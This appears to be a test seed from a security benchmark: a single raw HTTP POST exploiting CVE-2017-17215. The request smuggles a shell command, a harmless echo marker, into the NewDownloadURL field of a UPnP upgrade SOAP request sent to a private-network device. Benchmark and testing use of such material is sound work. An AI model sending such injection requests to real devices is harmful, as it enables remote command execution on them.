benchmark/CVE-2017-17215/test_seed/CVE-2017-17215

POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
Host: 192.168.2.2:37215
User-Agent: python-requests/2.25.1
Connection: keep-alive
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 384

<?xml version="1.0" ?>
    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
    <NewStatusURL>www.baidu.com</NewStatusURL>
<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>
</u:Upgrade>
    </s:Body>
    </s:Envelope>